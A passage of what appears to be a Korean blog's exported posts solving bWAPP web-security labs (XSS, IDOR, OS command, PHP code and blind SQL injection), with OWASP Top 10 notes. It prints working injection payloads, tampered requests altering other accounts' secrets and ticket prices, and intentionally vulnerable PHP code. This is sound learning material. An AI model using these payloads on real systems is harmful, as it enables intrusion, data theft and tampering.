$_SERVER[&quot;HTTP_HOST&quot;] . urldecode($_SERVER[&quot;REQUEST_URI&quot;]);$url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . $_SERVER[&quot;REQUEST_URI&quot;]; Burp Suite을 사용하면 문자열 그대로 요청이 되기 때문에 Burp Suite를 사용한 것이다. Medium이 문제는 취약점이 실행되지 않는다. 1$url = &quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;; Medium Level에서는 URL를 document.write을 이용하여 페이지에 출력을 한다.문제는 자바스크립트로 실행되기 때문에 마지막에 실행된다는 점을 이용한 취약점이다. (브라우저에서 자바스크립트 소스코드를 마지막에 실행시킨다.) 취약점의 이름은 DOM Xss라고 한다.하지만 지금은 모든 브라우저에서 패치를 했는지, Iternet Expoler에서도 실행이 안된다. 12345678910GET /bWAPP/htmli_current_url.php#&lt;h1&gt;test&lt;/h1&gt; HTTP/1.1Host: 192.168.219.111Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=a10521c7e9d86bd7482f26f136d6cbe2; security_level=1Connection: close URL 뒤에 #은 fragment이라고 한다.fragment은 브라우저 내부에서 사용되는 값이다. High1$url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . xss_check_3($_SERVER[&quot;REQUEST_URI&quot;]); HTML Injection - Reflected(GET)의 High Level에서 봤던 xss_check_3을 사용하여 검증했다.취약점은 못찾았다. DOM Xss이란?정확한 명칭은 DOM Based Xss이라고 한다.(type-0 Xss이라고도 불리기도 함.)DOM Xss은 브라우저에서 DOM 렌더링에서 실행되는 Xss공격이다. DOM에 대한 지식이 필요함으로 밑에 적은 블로그의 글을 읽고 이해하시면 된다. [참고 사이트] WIT블로그 : https://wit.nts-corp.com/2019/02/14/5522","link":"/2020/12/06/HTML-Injection-Reflected-URL/"},{"title":"HTML Injection - Stored(Blog)","text":"Low일단 HTML 태그가 실행되는지 확인을 하겠다. HTML 태그가 실행이 되는거 보니, 입력에 대한 검증이 없는 것 같다. 자바스크립트가 실행이 되었으며, 입력된 스크립트는 저장이 되어 페이자가 실행될 때 마다 Cookie 값을 출력한다. 이상하게 코드가 전혀 다른 기능인 sqli_check_3함수를 실행시키고 있다.하지만 기능은 xss_check_1이 실행되는 거로 판단이 된다. Medium, High도 HTML Injection_Reflected(GET)과 같이 작동하는 것로 추측된다. 해당 풀이도 같으니, 더 작성하지는 않겠다.","link":"/2020/12/06/HTML-Injection-Stored-Blog/"},{"title":"Insecure DOR (Change Secret)","text":"IDOR이란?Insecure Direct Object Reference의 약자로, 공격자가 요청 메시지의 URL이나 파라미터를 변경하여 정상적으로 허용되지 않은 기능을 실행하거나 다른 사용자의 리소스에 접근할 수 있는 공격 문제풀이Low 해당 계정의 시크릿 정보를 변경하는 사이트이다. 확인을 위해 Test로 변경하여 SQL Injection (Login Form/User) 문제 페이지에서 조회하겠다. URL을 보니, Get 메소드가 아닌 Post 메소드로 작동한다. 자세하게 살펴보기 위해 프록시를 이용해서 확인하였다. 12345678910111213141516POST /insecure_direct_object_ref_1.php HTTP/1.1Host: XXX.XXX.XXX.XXXContent-Length: 36Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://XXX.XXX.XXX.XXXContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://XXX.XXX.XXX.XXX/insecure_direct_object_ref_1.phpAccept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=apcd6m4eamdnh3ounef36vsus5; security_level=0Connection: closesecret=test2&amp;login=bee&amp;action=change Body 부분을 보니, 입력한 Secret 값과 계정 정보, submit 값을 보내는 것을 볼 수 있다. 만약 bee가 아닌 다른 계정을 입력하면 그 계정의 시크릿이 변경이 되는지 확인을 하였다. LRTK의 계정 시크릿 정보는 bababababa이다. 이를 login 파라미터 수정을 통해 변경하겠다. 수정이 되는 모습을 확인할 수 있었다. Medium &amp; High1secret=test3&amp;token=942bdebf5252ff371011fd88bdbc300622cba84b&amp;action=change Bee 계정에서 LRTK 계정의 scret 값을 변경하려고 했는데 Low와 다르게 Token으로 계정을 분류한다. LRTK 계정의 토큰을 모르니 실패하였다.","link":"/2021/02/27/Insecure-DOR-Change-Secret/"},{"title":"Insecure DOR (Order Tickets)","text":"문제풀이Low이번엔 티켓을 구입하는 페이지가 나왔다. 프록시를 이용하여 어떤 값을 보내는지 확인하였다. 12345678910111213141516POST /insecure_direct_object_ref_2.php HTTP/1.1Host: XXX.XXX.XXX.XXXContent-Length: 46Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://XXX.XXX.XXX.XXXContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://XXX.XXX.XXX.XXX/insecure_direct_object_ref_2.phpAccept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=hmnqs8cjcddm4sle4f32ikluk3; security_level=0Connection: closeticket_quantity=1&amp;ticket_price=15&amp;action=order Body부분을 보니, 티켓 갯수와 가격을 서버에 보내는 것을 확인할 수 있었다. 갯수를 10, 가격을 1로 변경했을 때 어떻게 작동하는지 확인하였다. 티켓 수 만큼 가격이 계산되는 것 같았다. 간단하게 패킷을 수정하는 것만으로도 티켓 10표를 10유로로 구매할 수 있었다. Medium &amp; High1ticket_quantity=1&amp;action=order 가격 계산에 필요한 1표당 가격을 클라이언트에서 받아오지 않고 서버에서 갖고있다가 표의 개수 곱하기를 하여 가격을 계산하였다. 이에 따라 패킷을 수정하여 가격을 변경하는 행위를 막을 수 있었다.","link":"/2021/03/02/Insecure-DOR-Order-Tickets/"},{"title":"Insecure DOR (Reset Secret)","text":"문제풀이Low &amp; Medium &amp; High 이번엔 계정의 Scret 값을 Any bugs?로 변경해주는 사이트가 나왔다. 프록시를 이용하여 서버에 어떤 값을 보내는지 확인하였다. 1234567891011121314POST /xxe-2.php HTTP/1.1Host: XXX.XXX.XXX.XXXContent-Length: 59User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36Content-type: text/xml; charset=UTF-8Accept: */*Origin: http://XXX.XXX.XXX.XXXReferer: http://XXX.XXX.XXX.XXX/insecure_direct_object_ref_3.phpAccept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=hmnqs8cjcddm4sle4f32ikluk3; security_level=0Connection: close&lt;reset&gt;&lt;login&gt;bee&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; Body부분을 확인해보니, XML형식으로 데이터를 보내주고 있었다. 이번에도 bee 대신에 다른 계정을 삽입하여 보낸다면 그 계정의 Scret 값이 Any bugs?로 초기화가 되겠지만, 일단 bee 계정을 초기화 해보았다. 이번엔 LRTK 계정의 Scret을 초기화하겠다. 1&lt;reset&gt;&lt;login&gt;lrtk&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; 간단하게 변경되는 것을 볼 수 있다.","link":"/2021/03/02/Insecure-DOR-Reset-Secret/"},{"title":"KISEC - 그들의 사이버 첩보전 이야기 (OSINT에 대하여) 강의 후기","text":"평소에 OSINT에 관심이 있어서 강의를 수강하려 KISEC으로 갔다. 강의에서 정말 많이 배울 수 있었다. 평소에 다크웹에 들어갈 때 감염의 위험을 두려워서 VM 위에 토르와 VPN으로 접속했는데 강사님의 말씀으로 파일을 다운로드 안하는 이상 감염은 그리 신경 안써도 된다고 한다. 또한 토르말고 일반 브라우저로 onion 사이트를 접속할 수 있는 방법을 알려주셨는데 다크웹에 접속하기 위해 고생한 것이 헛고생이 되었다. 강의 내용 중에서 가장 흥미로운 것이 디지털 교도소와 n번방의 관계를 OSINT를 이용하여 증명한 CASE가 흥미롭고 재밌었다. CASE에서 어떻게 디지털 교도소가 서버의 위치를 숨기는 방법, 추적을 피하기 위한 서비스 등을 알려주셨는데 그동안 궁금하였던 것이 풀어졌던 순간이였다. 다만 아쉬운 점이 강의가 8시간으로 다소 짧은 시간이라는 점이다. 좀 더 길게 진행됬으면 더 많은 것을 배울 수 있지만, 현 강의도 충분히 배울 내용이 많았다.","link":"/2021/03/04/KISEC-%EA%B7%B8%EB%93%A4%EC%9D%98-%EC%82%AC%EC%9D%B4%EB%B2%84-%EC%B2%A9%EB%B3%B4%EC%A0%84-%EC%9D%B4%EC%95%BC%EA%B8%B0-OSINT%EC%97%90-%EB%8C%80%ED%95%98%EC%97%AC-%EA%B0%95%EC%9D%98-%ED%9B%84%EA%B8%B0/"},{"title":"OS Injection Blind","text":"Blind Command Injection이란?시스템 명령의 수행 결과 값이 없이 수행하는 Injection 공격이다. LowForm에 IP나 도메인을 입력하면 Ping을 보내는 페이지인 것 같다.DNS 서버인 8.8.8.8를 입력하여 어떻게 출력되는지 확인하였다. Did you captured our GOLDEN packet?이라는 문구만 출력이 되고, 잘 작동되는지도 모르겠다.그래서 확실한 오류를 일으키고자, 입력 값을 넣지 않고 서버에 넘겨보았다. IP를 입력하라는 문구가 나오는 것을 확인할 수 있었다.빈 입력 값을 검증하는 코드가 있는 것 같다. 다른 방법으로 현재 나의 집 라우터에 없는 주소를 입력하여 오류를 일으켜보겠다.DNS 서버의 IP을 넘겨줄 때랑 같은 문구를 확인 할 수 있었다.문제의 이름처럼 Blind로 이루어진 페이지로 확인이 되었다. 이제 OS Command Injection 문제처럼 다중 명령어를 사용하여 Command Injection을 시도하였다. 8.8.8.8 &amp; echo hi!! &gt;&gt; test.txt를 입력해주었다.나는 Injection 잘 수행이 되었는지 확인하기 위해서 test.txt를 생성하였다. 또 다른 확인 방법은 Netcat을 이용하여 확인하는 방법이 있다. 서버에 Injection 입력 값을 넘겨주고, 파일이 잘 생성됬는지 확인하였다.http://localhost/bWAPP/test.txt 잘 생성이 된 것을 확인할 수 있다. 이 취약점을 이용하여 악성코드를 이처럼 만들 수도 있고, 아니면 파일을 삭제를 할 수 있다. Source Codefunctions_external.php 123function no_check($data){ return $data;} commandi_blind.php 1234567891011121314151617181920212223if($target == &quot;&quot;){ echo &quot;&lt;font color=\\&quot;red\\&quot;&gt;Please enter your IP address...&lt;/font&gt;&quot;;}else{ echo &quot;Did you captured our GOLDEN packet?&quot;; if(PHP_OS == &quot;Windows&quot; or PHP_OS == &quot;WINNT&quot; or PHP_OS == &quot;WIN32&quot;){ // Debugging // echo &quot;Windows!&quot;; // Increasing the PING count will slow down your web scanner! shell_exec(&quot;ping -n 1 &quot; . commandi($target)); } else{ // Debugging // echo &quot;Not Windows!&quot;; // Increasing the PING count will slow down your web scanner! shell_exec(&quot;ping -c 1 &quot; . commandi($target)); }} 코드를 보니 입력 값을 검사하는 항목은 빈 입력을 검사하는 것 밖에 없다. Medium아마 OS Command Injection 문제의 Medium Leval처럼 특정 문자를 치환하는 것으로 방어를 할 것으로 생각되지만 일단 해보겠다. 8.8.8.8 | echo Hi!! Medium &gt;&gt; test.txt을 입력하여 제대로 생성이 됬는지 확인하였다.예상대로 OS Command Injection 문제와 똑같이 방어를 한 것으로 추측된다. Source Code123456function commandi_check_1($data){ $input = str_replace(&quot;&amp;&quot;, &quot;&quot;, $data); $input = str_replace(&quot;;&quot;, &quot;&quot;, $input); return $input; } 파이프(|)가 치환되지 않았다. 또한 Command Injection에 많이 쓰이는 {}, (), $ 등등 다른 것들도 치환하지 않는 것을 확인할 수 있었다. High123function commandi_check_2($data){ return escapeshellcmd($data); } 이에 대한 설명은 OS Command Injection에서 확인하면 된다.Link : http://lrtk-github.io/2020/12/12/OS-Injection/","link":"/2020/12/12/OS-Injection-Blind/"},{"title":"OS Injection","text":"리눅스 다중 명령어 세미클론(;) : 하나의 라인에 주어진 명령어들을 성공,실패와 관련 없이 전부 실행한다. 파이프(|) : 앞 명령어의 실행 결과를 뒤 명령어에 전달하여 실행한다. 더블 버티컬바(||) : 앞에서부터 순차적으로 실행하되, 명령 실행에 성공하면 뒤에 오는 명령을 실행하지 않는다. 엠퍼센트(&amp;) : 앞의 명령어를 백그라운드로 돌리고 동시에 뒤의 명령어를 실행한다. 더블 엠퍼센트(&amp;&amp;) : 앞에서부터 순차적으로 실행하되, 명령 실행에 실패할 경우 뒤에 오는 명령은 실행하지 않는다. Lowform에 nslookup 명령어 인자값을 전달 받아서 nslookup을 실행하는 페이지인 것 같다.리눅스의 다중 명령어를 삽입하였다. www.nsa.gov &amp; ls -al commandi.php 성공한 것을 보니 아마 검증이 없는 것 같다. Source Code123function no_check($data){ return $data; } 코드를 보니 검증이 없었다. MediumLow Level에 시도한 &amp;은 검증을 통해 제거가 된 것 같다.또한 nslookup 결과도 안뜨는 것을 보니 특정 문자가 있으면 넘어온 데이터를 제거를 하는 것 같다. 현 입력에서 쓸 수 있는 다중 명령어(;, |)도 블랙리스트에 들어있는지 확인 하였다. www.nsa.gov | ls -al commandi.php 파이프는 블랙리스트에 없던 것으로 결과가 나왔다. Source Code123456function commandi_check_1($data){ $input = str_replace(&quot;&amp;&quot;, &quot;&quot;, $data); $input = str_replace(&quot;;&quot;, &quot;&quot;, $input); return $input; } 소스코드를 보니 역시 파이프(|)는 검증에 넣지 않은 모습을 확인 할 수 있었다.하지만 좀 이상한 것은 특정 문자가 있으면 지워서 반환을 하는데 nslookup 명령어는 왜 실행이 안된는 것은 디버깅을 통해 알아봐야 할 것 같다. Hight시도하였지만 모두 통하지 않았다…또한 다중 명령어 말고도 \\n, $()으로도 우회를 시도하였지만 차단되었다. Source Code123function commandi_check_2($data){ return escapeshellcmd($data);} escapeshellcmd 함수를 이용하여 OS Command Injection를 방어한 것을 확인 할 수 있었다. escapeshellcmd이란?link : https://www.php.net/manual/en/function.escapeshellcmd.php OS Injection에 사용될 수있는 문자열의 모든 문자를 이스케이프하는 함수이다. [ 치환 목록 ]&amp; # ; ` | * ? ~ &lt;&gt; ^ () [] {} $ \\ \\x0A \\xFF 이 문자는 앞에 \\를 붙어서 치환이 된다.또한 ', &quot;은 하나의 쌍으로 되었을 때만 치환이 된다. escapeshellcmd 함수의 우회법은 몇가지가 있어서 추후에 우회를 시도하겠다.","link":"/2020/12/11/OS-Injection/"},{"title":"OWASP TOP 10 A1 - Injection","text":"InjectionSQL, OS, XEE, LDAP 인젝션 취약점은 신뢰할 수 없는 데이터가 명령어나 쿼리문의 일부분으로써, 인터프리터로 보내질 때 발생함. 공격자의 악의적인 데이터는 예상치 못한 명령을 실행하거나 올바른 권한 없이 데이터에 접근하도록 인터프리터를 속일 수 있음. 내가 이해한 Injection한 사람(서버)이 있는데 백신 주사를 맞아야함. 간호사(사용자)가 백신이 들어있는 주사기를 혈관(인터프리터)에 삽입하여 백신(DB Query, OS 명령어 등 중 하나)을 주입을 함. 다음날 2차 백신을 맞기 위해 다시 한번 주사를 맞았는데 나쁜 간호사(공격자)가 백신이 아닌 바이러스(SQL Injection, OS Injection 등 중 하나)를 주사를 혈관(인터프리터)에 삽입하여 주입하였음. 공격 요인환경 변수, 파라미터, 내/외부 웹 서비스, 모든 유형의 사용자 등 거의 모든 데이터의 소스는 인젝션 공격 요인이 될 수 있음. 공격자가 악의적인 데이터를 인터프리터에 보낼 때 인젝션 결함이 발생함. 보안 취약점인젝션 취약점은 매우 일반적이며, 특히 과거에 사용된 코드에서 많이 나타남. SQL, LDAP, XPath, NoSQL, ORM 쿼리 / OS 명령어 / XML 파서 / SMTP 헤더 / 표현식 언어 등에서 자주 발견됨. 인젝션 취약점은 코드를 검증하는 과정에서 쉽게 발견할 수 있음. 공격자는 스캐너와 퍼저로 인젝션 결함을 찾는데 도움을 얻음. 영향인젝션은 데이터 손실, 파괴, 권한 없는 사용자에게 정보 노출, 승인되지 않은 당사자에게 정보 무단 공개, 책임 부재, 서비스 거부 결과를 초래 할 수 있음. 떄때로 인젝션으로 호스트를 완전하게 탈취할 수도 있음. 비즈니스는 애플리케이션과 데이터의 필요성에 따라 달라짐. 취약점 확인법취약한 공격 목록 사용자 제공 데이터가 유효하지 않거나, 필터링 되어지지 않거나, 애플리케이션에 의해 정제되지 않음. 상황 인식 기반 필터링 없이 동적 쿼리나 매개 변수화 되지 않은 호출이 인터프리터에서 직접 사용됨. 악의적인 데이터가 ORM(객체 관계형 매핑) 검색 매개 변수 내에서 사용되어 추가로 민감한 정보를 추출함. 악의적인 데이터가 직접적으로 동적 쿼리 안에 포함된 구조적 데이터와 악의적 데이터를 포함한 명령어, 일반 명령어, SQL, 저장 프로시저에 사용되거나 연결됨. 보다 일반적으로 SQL, NoSQL, OS 명령어, ORM, LDAP,EL(Expression Languages), OGNL(Object Graph Navigation Library) 인젝션이 있음. 애플리케이션이 인젝션에 취약한지 판별하기 위해선 소스코드를 리뷰하는 것과 더불어 모든 파라미터, 헤더, URL, 쿠키, JSON, SOAP,, XML 데이터 입력에 대한 철저한 자동화 테스트가 가장 좋은 방법임. 기관은 정적 애프리케이션 보안 테스트(SAST)와 동적 애플리케이션 테스트(DAST) 툴을 CI/CD 파이프라인에 포함시켜 새로운 인젝션 결합을 운영 시스템 배포 전에 발견할 수 있음. 공격 시나리오 예제애플리케이션은 취약한 SQL 호출 구조에서 신뢰되지 않은 데이터를 사용함.1String query = &quot;SELECT * FROM accounts WHERE custID='&quot; + request.getParameter(&quot;ID&quot;) + &quot;'&quot;; 프레임워크에 대한 애플리케이션의 맹목적인 신뢰는 여전히 취약한 쿼리를 초래함.1Query HQLQuery = session.createQuery(&quot;FROM accounts WHERE custID='&quot; + request.getParameter(&quot;id&quot;) + &quot;'&quot;); 시나리오 1, 시나리오 2 사례로 보아, 공격자는 브라우저에서 전송할 ‘id’ 파라미터 값을 ' or '1'='1수정함. htttp://example.com/app/accountView?id=' or '1'='1 이렇게 하면, 두 쿼리의 의미가 변경되어 accounts 테이블의 모든 레코드가 반환됨. 더 위험한 공격은 저장 프로시저의 데이터를 수정하거나 파괴함. 보안 대책인젝션을 예방하기 위해선 데이터를 지속적으로 명령어와 쿼리로부터 분리시켜야함. 기본 옵션은 인터프리터 사용을 피하거나 매개변수화된 인터페이스를 제공하는 안전한 API를 사용하거나 ORMs 툴을 사용하도록 마이그레이션하는 것 서버 측 “화이트리스트”나 적극적인 입력값 유효성 검증을 해야함. 하지만 많은 애플리케이션이 모바일 애플리케이션을 위한 텍스트 영역이나 API와 같은 특수 문자를 필요로 하기에 완벽한 방어책은 아님. 남은 동적 쿼리들을 위하여 특정 필터링 구문을 사용하여 인터프리터에 대한 특수 문자를 필터링 처리해야함. 주의 : 테이블, 컬럼 이름 등과 같은 SQL 구조는 필터링 처리를 할 수가 없기 때문에 사용자가 제공한 구조 이름은 안전하지 않음. 이는 보고서 작성 소프트웨어의 일반적인 문제임. LIMIT과 다른 SQL 컨트롤 쿼리를 사용하여 SQL 인젝션으로 인한 대량 노출을 예방해야함.","link":"/2021/02/16/OWASP-TOP-10-A1-Injection/"},{"title":"OWASP TOP 10 A2 - Broken Authentication","text":"Broken Authentication인증 및 세션 관리와 관련된 애플리케이션 기능이 종종 잘못 구현되어 공격자가 암호, 키, 세션 토큰을 위험에 노출 시킬 수 있거나 일시적인 또는 영구적으로 다른 사용자의 권한 획득을 위해 구현 상 결함을 악용하도록 허용함. 공격요인공격자는 자격 증명 자료, 기본 관리 계정 목록, 자동화된 무차별 대입 및 사전 공격 툴, 고급 GPU 크래킹 툴을 통해 수억 개의 유효한 사용자명 및 암호 조합에 접근할 수 있음. 세션 관리 공격은 특히 만료되지 않은 세션 토큰과 관련하여 잘 알려져 있음. 보안 취약점대부분의 ID 및 접근 제어의 설계와 구현으로 인해 취약한 인증이 광범위하게 나타남. 세션 관리는 인증 및 접근 제어의 기반이며, 모든 상태를 저장하는 애플리케이션에 있음. 공격자는 수동으로 취약한 인증을 탐지하고 비밀번호 목록을 가진 툴과 사전 기반 공격으로 침투할 수 있음. 영향공격자는 시스템을 손상시킬 수 있는 소수의 계정들이나 하나의 관리자 계정에만 접근하면 됨. 애플리케이션의 도메인에 따라 돈세탁, 사기, 신원 도용이 허용되거나 법적으로 보호되어야 하는 기밀 정보가 공개될 수 있음. 취약점 확인 방법인증과 관련된 공격으로부터 보호하기 위해서 사용자의 신원, 인증 및 세션을 관리하는 것이 매우 중요함. 취약한 공격 목록 공격자가 유효한 사용자 이름과 비밀번호를 가진 상태에서 계정 정보 삽입과 같은 자동화 공격을 허용함. 무차별 공격 또는 기타 자동화 공격을 허용함. “Password1” 또는 “admin/admin”과 같은 기본 암호, 약한 암호 또는 잘 알려진 암호를 허용함. 안전하지 않게 만들어진 “지식 기반 답변”과 같은 취약하거나 효과가 없는 자격 증명 복구나 비밀번호 복구를 허용함. 평문, 암호화되거나 취약한 해쉬 비밀번호를 사용함. (참조 : OWASP TOP 10 2017 A3 Sensitive Data Exposure) 다중 인증이 없거나 비효율적임. 세션 ID가 URL에 노출됨.(e.g. URL Rewriting) 세션 ID를 제대로 무효화 시키지 않아거나, 로그아웃이나 비활성기간 중에 사용자 세션 및 인증 토큰(e.g. SSO 토큰)이 제대로 무효화 되지 않았음. 보안 대책 가능한 경우, 다중 인증을 구현하여 자동화된 계정 정보 삽입, 무차별 공격, 탈취된 계정 정보 재사용 공격을 예방함. admin 계정이나 중요한 계정의 경우 기본 계정 정보를 사용하여 제공하거나 배포하지 말아야함. 비밀번호를 생성하거나 변경할 때 최악의 TOP 10000개 비밀번호 목록 이외로 설정하도록 하는 것과 같은 약한 비밀번호 검사를 해야함. NIST SP800 memsecret에 따라 암호 길이, 복잡성 및 순환 정책 또는 다른 최신 정책, 근거 기반 암호 정책을 조정함. 계정 열거 공격에 대한 대비로 모든 결과에 대해 동일한 메시지를 사용하여 등록, 계정 정보 복구, API 경로를 강화해야함. 로그인 실패에 대한 제한이나 시간 연기를 해야함. 모든 실패에 대해 로그를 남기고 계정 정보 삽입, 무차별 공격, 다른 공격들이 탐지되면 관리자에게 알람이 오도록 설정해야함. 로그인 이후에 예측 불허한 무작위 세션 ID를 생성하는 서버 측의 안전한 내장 세션 관리자를 사용해야 함. 세션 ID는 URL에 없어야 하며, 매우 안전하게 보관되어야 하고 로그아웃 유휴 및 시간 초과 이후 무효가 되어야 함.","link":"/2021/02/17/OWASP-TOP-10-A2-Broken-Authentication/"},{"title":"PHP Code Injection","text":"PHP Code Injection이란?웹 어플리케이션을 통해 PHP 코드를 입력하면, 웹 어플리케이션의 입력을 정상적으로 인식하여 개발자가 의도와는 다르게 내부에 있는 PHP 코드를 실행하는 취약점이다. Low페이지를 들어가니 This is just a test page, reflecting back your message...이라는 문구를 확인 할 수 있었다. 123&lt;p&gt;This is just a test page, reflecting back your &lt;a href=&quot;/bWAPP/phpi.php?message=test&quot;&gt;message&lt;/a&gt;...&lt;/p&gt; message를 자세히보니 a태그로 되어있는 것을 확인할 수 있었다. 클릭하여 넘어가보니, 서버에 message이라는 변수에 test를 넘어갔다.페이지에 그대로 test라는 문구가 써져있는 것을 확인할 수 있었다. 저는 message에 php 내장 함수를 넘겨서 어떻게 작동하는지 확인해보았다.http://localhost/bWAPP/phpi.php?message=exec(id) 실행이 잘되는 것을 확인할 수 있었다. Source Code123456if(isset($_REQUEST[&quot;message&quot;])){ // If the security level is not MEDIUM or HIGH if($_COOKIE[&quot;security_level&quot;] != &quot;1&quot; &amp;&amp; $_COOKIE[&quot;security_level&quot;] != &quot;2&quot;){ &lt;p&gt;&lt;i&gt;&lt;?php @eval (&quot;echo &quot; . $_REQUEST[&quot;message&quot;] . &quot;;&quot;);?&gt;&lt;/i&gt;&lt;/p&gt; }} 코드를 보니 message 변수에 넘기고, 아무 검증 없이 eval 함수를 이용하여 바로 출력하여 페이지에 반영하는 것을 볼 수 있다. Medium &amp; High 이번엔 검증이 추가가 되었는지 Low Level에서 했던 방법이 안된다.도통 모르겠어서 소스코드를 확인해보았다. Source Code1234// If the security level is MEDIUM or HIGHelse{ &lt;p&gt;&lt;i&gt;&lt;?php echo htmlspecialchars($_REQUEST[&quot;message&quot;], ENT_QUOTES, &quot;UTF-8&quot;);;?&gt;&lt;/i&gt;&lt;/p&gt;} 확인해보니 Medium &amp; High Level 같은 방어 방법으로 해결을 하였다.바로 htmlspecialchars 함수를 이용하여 특수 문자를 필터링하여 Injection을 방어하였다.","link":"/2020/12/15/PHP-Code-Injection/"},{"title":"SQL Injection(AJAX, JSON, JQUERY)","text":"Low보시는 것과 같이 첫번째 SQL Injection과 같은 문제가 나왔다.차이점이라면 자바스크립트를 사용하여 서버로 넘겨서 데이터를 받았다는 것이다. 개발자 도구를 이용하여 자바스크립트를 확인하겠다. 1234567891011121314151617181920212223242526272829303132$(&quot;#title&quot;).keyup(function(){ // Searches for a movie title var search = {title: $(&quot;#title&quot;).val()}; // AJAX call $.getJSON(&quot;sqli_10-2.php&quot;, search, function(data){ init_table(); // Constructs the table from the JSON data var total = 0; $.each(data, function(key, val){ total++; $(&quot;#table_yellow tr:last&quot;).after(&quot;&lt;tr&gt;&lt;td&gt;&quot; + val.title + &quot;&lt;/td&gt;&lt;td align='center'&gt;&quot; + val.release_year + &quot;&lt;/td&gt;&lt;td&gt;&quot; + val.main_character + &quot;&lt;/td&gt;&lt;td align='center'&gt;&quot; + val.genre + &quot;&lt;/td&gt;&lt;td align='center'&gt;&lt;a href='http://www.imdb.com/title/&quot; + val.imdb + &quot;' target='_blank'&gt;Link&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&quot;); }); // Empty result if (total == 0) { $(&quot;#table_yellow tr:last&quot;).after(&quot;&lt;tr height='30'&gt;&lt;td colspan='5' width='580'&gt;No movies were found!&lt;/td&gt;&lt;/tr&gt;&quot;); } })});function init_table(){ $(&quot;#table_yellow&quot;).html(&quot;&lt;tr height='30' bgcolor='#ffb717' align='center'&gt;&quot; + &quot;&lt;td width='200'&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;&quot; + &quot;&lt;td width='80'&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;&quot; + &quot;&lt;td width='140'&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;&quot; + &quot;&lt;td width='80'&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;&quot; + &quot;&lt;td width='80'&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;&quot; + &quot;&lt;/tr&gt;&quot; );} 위와 같이 자바스크립트의 JQUERY를 이용하여 입력한 데이터를 받았다.그 후 AJAX로 데이터를 sqli_10-2.php로 넘겼다.한번 sqli_10-2.php에 Injection 코드를 넘겨보겠다. sqli_10-2.php에게 받은 데이터는 JSON 형식으로 영화 데이터였다. 이와 같이 꼭 HTML의 Form만 아니라 다양한 입력 방식을 통해서 Injection 가능하다는 것을 배울 수 있었다. Source Codefunctions_external.php 123function no_check($data){ return $data; } sqli_10_2.php 1234567891011if(!empty($_GET[&quot;title&quot;])){ // Retrieves the movie title $title = $_GET[&quot;title&quot;]; // Constructs the query $sql = &quot;SELECT * FROM movies WHERE title LIKE '%&quot; . sqli($title) . &quot;%'&quot;; // Queries the database $recordset = mysql_query($sql, $link);} 위와 같이 입력 데이터에 아무 검증 없이 sql문에 넣는 것을 확인 할 수 있었다. Medium &amp; High2문제는 추후에 우회 방법을 찾는대로 업로드하겠다.","link":"/2020/12/20/SQL-Injection-AJAX-JSON-JQUERY/"},{"title":"SQL Injection - Blind (Boolean-Based)","text":"Boolean Based SQLi이란?SQL Injection의 결과가 참과 거짓으로만 나오는 페이지에서 참, 거짓만으로 DB의 정보를 가지고오는 SQL Injection 공격 Low Error로 정보를 얻어보려고 했지만, DB의 에러 메시지는 출력되지 않았다. 검색을 위한 SQL문이 SELECT ~~~ FROM ~~~ WHERE ~~~='입력값';이라는 형태라는 것을 생각하여 ' or '1'='1를 시도했다.모든 정보를 가져오려고 했지만, 데이터 출력은 실패하였고, 입력된 데이터와 같은 영화는 DB에 존재한다는 참 출력값을 얻을 수 있었다. 이번엔 다른 출력값을 보기 위해서 ' or '1'='2를 넣고 결과를 출력하였다.존재하지 않는다는 거짓 출력값을 얻을 수 있었다. 이 3개의 출력값을 이용하여 DB의 데이터를 추측할 수 있다. 컬럼의 갯수 파악' order by ~;# or union select ~;#를 이용하여 컬럼의 갯수를 파악하겠다. - `' order by ~;#` 에러 메시지가 나올 때까지 점차 숫자를 올려갔다. 컬럼의 갯수가 7개라는 것을 알아낼 수 있었다. - ' union select ~;# 이것 역시 검색 쿼리에서 지정한 컬럼의 갯수를 알아낼 수 있는 방법 중 하나이다. 컬럼의 갯수 : 7개 DB의 이름 길이 파악length 함수를 이용하여 이름의 길이를 알아낼 것이다.' or '1'='1' and length(database())=~;#or는 둘 중 